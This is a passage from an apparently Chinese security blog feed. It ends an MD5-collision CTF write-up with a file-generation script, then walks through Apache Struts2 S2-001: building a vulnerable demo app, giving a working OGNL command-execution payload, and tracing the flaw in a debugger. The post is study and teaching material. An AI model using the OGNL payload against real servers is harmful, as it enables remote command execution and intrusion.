f.read()</span><br><span class="line">    coll_1_1 = file_1_1[len(file_1):]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test_1_2.txt"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_1_2 = f.read()</span><br><span class="line">    coll_1_2 = file_1_2[len(file_2):]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test_1_1_1.txt"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_1_1_1 = f.read()</span><br><span class="line">    coll_1_1_1 = file_1_1_1[len(file_1_1):]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test_1_1_2.txt"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_1_1_2 = f.read()</span><br><span class="line">    coll_1_1_2 = file_1_1_2[len(file_1_2):]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">w</span><span class="params">(fn, data)</span>:</span></span><br><span class="line">    f = open(fn, <span class="string">"wb"</span>)</span><br><span class="line">    f.write(data)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">w(<span class="string">"test1.txt"</span>, base + coll_1 + coll_1_1 + coll_1_1_1)</span><br><span class="line">w(<span class="string">"test2.txt"</span>, base + coll_1 + coll_1_1 + coll_1_1_2)</span><br><span class="line">w(<span class="string">"test3.txt"</span>, base + coll_1 + coll_1_2 + coll_1_1_1)</span><br><span class="line">w(<span class="string">"test4.txt"</span>, base + coll_1 + coll_1_2 + coll_1_1_2)</span><br><span class="line">w(<span class="string">"test5.txt"</span>, base + coll_2 + coll_1_1 + coll_1_1_1)</span><br><span class="line">w(<span class="string">"test6.txt"</span>, base + coll_2 + coll_1_2 + coll_1_1_1)</span><br></pre></td></tr></table></figure><p>这样就可以生成6个文件内容不同，但是它们的md5都相同，事实上，你可以生成任意多个</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实很多题目都是类似的，需要我们自己动手写脚本，本质上就是去找hash加密后的字符串前两位是<code>0e</code>，后30位是纯数字的，只要会写脚本，就是万变不离其宗</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.jianshu.com/p/c9089fd5b1ba" target="_blank" rel="noopener">MD5碰撞的一些例子</a></li><li><a href="https://natmchugh.blogspot.com/2015/05/how-to-make-two-binaries-with-same-md5.html" target="_blank" rel="noopener">How to make two binaries with the same MD5 hash</a></li><li><a href="https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html" target="_blank" rel="noopener">How I made two PHP files with the same MD5 hash</a></li><li><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">Are there two known strings which have the same MD5 hash value?</a></li><li><a href="https://stackoverflow.com/questions/3475648/sha1-collision-demo-example" target="_blank" rel="noopener">SHA1 collision demo / example</a></li><li><a href="https://stratum0.org/blog/posts/2013/08/10/ebctf2013-md5-colliding/" target="_blank" rel="noopener">ebctf 2013: MD5 COLLIDING</a></li><li><a href="https://evi0s.com/2019/02/09/md5-collisions/" target="_blank" rel="noopener">PHP中MD5碰撞Bypass</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF中关于md5的一些总结&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>从零开始学习struts2漏洞———S2-001</title>
    <link href="http://0clickjacking0.github.io/2020/08/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94%E2%80%94S2-001/"/>
    <id>http://0clickjacking0.github.io/2020/08/15/从零开始学习struts2漏洞———S2-001/</id>
    <published>2020-08-15T01:58:48.000Z</published>
    <updated>2021-01-31T09:24:41.223Z</updated>
    
    <content type="html"><![CDATA[<p>从零开始学习struts2漏洞———S2-001</p><a id="more"></a><h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>漏洞信息页面： <a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p><p>漏洞成因官方概述：Remote code exploit on form validation error</p><p>漏洞影响：</p><p>WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>平台：macos15</p><p>工具：</p><ul><li>idea2020</li><li>Tomcat 8.5</li></ul><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>在IDEA中新建一个project</p><p><img src="http://images.xianyu123.club/20200815100542.png" alt="image-20200815100542938"></p><p>创建好project项目后，结构如下</p><p><img src="http://images.xianyu123.club/20200815101421.png" alt="image-20200815101420976"></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>下载<a href="https://raw.githubusercontent.com/vulhub/vulhub/master/struts2/s2-001/S2-001.war" target="_blank" rel="noopener">一些jar包和配置文件</a></p><p>在<code>WEB-INF</code>目录中新建lib目录，将下载的war包解压开来，将所需的五个包放入</p><p><img src="http://images.xianyu123.club/20200815101705.png" alt="image-20200815101705451"></p><p>修改<strong>web.xml</strong>内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>S2-001 Example<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建index.jsp和welcome.jsp内容如下</p><p><strong>index.jsp</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>welcome.jsp</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>完成之后，如下图所示</p><p><img src="http://images.xianyu123.club/20200815102125.png" alt="image-20200815102125461"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>在src目录下新建<code>com.demo.action</code>package</p><p>在package下新建一个<code>LoginAction.java</code>，内容如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在src目录下新建struts.xml，内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-001"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>结果如下图所示：</strong></p><p><img src="http://images.xianyu123.club/20200815141838.png" alt="image-20200815141838498"></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>这时候会看到LoginAction会一直显示找不到要导入的<code>opensymphony.xwork2.ActionSupport</code>，是由于jar包还没有真正的被导入到这个项目中</p><p><img src="http://images.xianyu123.club/20200815102835.png" alt="image-20200815102834990"></p><p>点击<code>File-&gt;Project Structure</code></p><p><img src="http://images.xianyu123.club/20200815102737.png" alt="image-20200815102737187"></p><p><img src="http://images.xianyu123.club/20200815102907.png" alt="image-20200815102907608"></p><p>然后找到刚才在lib目录下的jar包，点上勾之后点击OK即可</p><p>然后<code>Build-&gt;Build Project</code>build一下整个项目，刚才的包就被成功的导入到项目中，错误提示也就消失了</p><h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>在<code>Run——Edit Configurations</code>一下tomcat的环境即可</p><p><img src="http://images.xianyu123.club/20200815122921.png" alt="image-20200815122921009"></p><p>配置项目路径和端口，配置完成后运行tomcat就可以启动了</p><p><img src="http://images.xianyu123.club/20200815123032.png" alt="image-20200815123032227"></p><p>配置项目路径</p><p><img src="http://images.xianyu123.club/20200815123256.png" alt="image-20200815123256613"></p><p><strong>配置成功后启动如下图：</strong></p><p><img src="http://images.xianyu123.club/20200815123408.png" alt="image-20200815123408534"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><strong>poc验证：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;1+1&#125;</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200819103900.png" alt="image-20200819103900762"></p><p><strong>命令执行：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>将<code>new java.lang.String[]{&quot;whoami&quot;})</code>中的<code>whoami</code>替换为对应的命令，即可执行。</p><p><img src="http://images.xianyu123.club/20200819105249.png" alt="image-20200819105249076"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在此之前，需要了解一些Struts2的工作原理的知识，方便我们后续代码审计</p><ol><li><a href="https://www.jianshu.com/p/ac89eaf1b6b5" target="_blank" rel="noopener">struts2处理http请求参数的流程</a></li></ol><p>首先了解一下<strong>拦截器</strong>的概念：</p><blockquote><p>拦截器是Struts2框架的核心，它主要完成解析请求参数、将请求参数赋值给Action属性、执行数据校验、文件上传等工作。</p></blockquote><p>关于拦截器的知识，可以参考：<a href="https://www.jianshu.com/p/30b62f11d6cb" target="_blank" rel="noopener">Struts2拦截器Interceptor</a></p><p>在<code>/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/struts-default.xml</code>中搜索<code>params</code>，我们可以找到拦截器的位置，跟进</p><p><img src="http://images.xianyu123.club/20200817135247.png" alt="image-20200817135241428"></p><p>我们从<code>S2_001/web/WEB-INF/lib/xwork-2.0.3.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.class</code>的<code>doIntercept()</code>方法开始调试，到达该方法的97行，step into跟进</p><p><img src="http://images.xianyu123.club/20200817140141.png" alt="image-20200817140141467"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code>的<code>invoke()</code>方法，然后继续Step over，到达<code>this.executeResult()</code>处Step into跟进</p><p><img src="http://images.xianyu123.club/20200817141102.png" alt="image-20200817141101980"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code>的<code>executeResult()</code>方法，然后继续Step over，到达<code>this.result.execute(this);</code>处Step into跟进</p><p><img src="http://images.xianyu123.club/20200817141410.png" alt="image-20200817141410455"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/org/apache/struts2/dispatcher/StrutsResultSupport.class</code>的<code>execute()</code>方法，然后继续Step over，到达<code>this.doExecute(this.lastFinalLocation, invocation);</code>处Step into跟进</p><p><img src="http://images.xianyu123.club/20200817141732.png" alt="image-20200817141731940"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/org/apache/struts2/dispatcher/ServletDispatcherResult.class</code>的<code>doExecute()</code>方法，然后继续Step over，到达<code>dispatcher.forward(request, response);</code>处Step into跟进</p><p><img src="http://images.xianyu123.club/20200817141859.png" alt="image-20200817141859818"></p><p>这里跟进比较多，过程就省略了，调用栈如下：</p><p><img src="http://images.xianyu123.club/20200816211718.png" alt="image-20200816211718233"></p><p>然后我们把断点重新设置在<code>/Struts2/S2_001/web/index.jsp</code>，这里就一直Step into</p><p><img src="http://images.xianyu123.club/20200817153640.png" alt="image-20200817153640789"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code>的<code>doStartTag()</code>方法，这个方法就是在解析标签，但这时的标签并不包含我们的payload，这里我们Step over</p><p><img src="http://images.xianyu123.club/20200817153056.png" alt="image-20200817153056106"></p><p>然后会返回到<code>/Struts2/S2_001/web/index.jsp</code>，接着Step into跟进</p><p><img src="http://images.xianyu123.club/20200817153901.png" alt="image-20200817153901281"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code>的<code>doEndTag()</code>方法，到达<code>this.component.end(this.pageContext.getOut(), this.getBody());</code>处Step into跟进</p><p><img src="http://images.xianyu123.club/20200817152944.png" alt="image-20200817152943999"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/StrutsBodyTagSupport.class</code>，继续Step into跟进</p><p><img src="http://images.xianyu123.club/20200817154146.png" alt="image-20200817154146021"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code>，然后继续跟进<code>evaluateParams();</code>方法</p><p><img src="http://images.xianyu123.club/20200817154308.png" alt="image-20200817154308077"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code>，然后继续Step over</p><p>这里因为开启了<code>altSyntax</code>，expr变为为<code>%{password}</code></p><p><img src="http://images.xianyu123.club/20200817155057.png" alt="image-20200817155057377"></p><p>到达<code>this.addParameter(&quot;nameValue&quot;, this.findValue(expr, valueClazz));</code>处Step into跟进</p><p><img src="http://images.xianyu123.club/20200817154650.png" alt="image-20200817154650278"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/struts2-core-2.0.8.jar!/org/apache/struts2/components/Component.class</code>，然后继续Step over，遇到<code>return TextParseUtil.translateVariables(&#39;%&#39;, expr, this.stack);</code>后Step into跟进</p><p><img src="http://images.xianyu123.club/20200817155250.png" alt="image-20200817155250719"></p><p>跟进后，到达<code>/Struts2/S2_001/web/WEB-INF/lib/xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class</code>，这里遇到一个递归函数，留意这个递归函数，Step into跟进（其实就在这个方法的下面）</p><p><img src="http://images.xianyu123.club/20200817155307.png" alt="image-20200817155307765"></p><p><code>translateVariables()</code>方法源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">translateVariables</span><span class="params">(<span class="keyword">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> </span>&#123;</span><br><span class="line">    Object result = expression;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> start = expression.indexOf(open + <span class="string">"&#123;"</span>);</span><br><span class="line">        <span class="keyword">int</span> length = expression.length();</span><br><span class="line">        <span class="keyword">int</span> x = start + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">'&#125;'</span>) &#123;</span><br><span class="line">                --count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> end = x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var = expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">        Object o = stack.findValue(var, asType);</span><br><span class="line">        <span class="keyword">if</span> (evaluator != <span class="keyword">null</span>) &#123;</span><br><span class="line">            o = evaluator.evaluate(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String left = expression.substring(<span class="number">0</span>, start);</span><br><span class="line">        String right = expression.substring(end + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                result = left + o;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                result = result + right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expression = left + o + right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = left + right;</span><br><span class="line">            expression = left + right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img 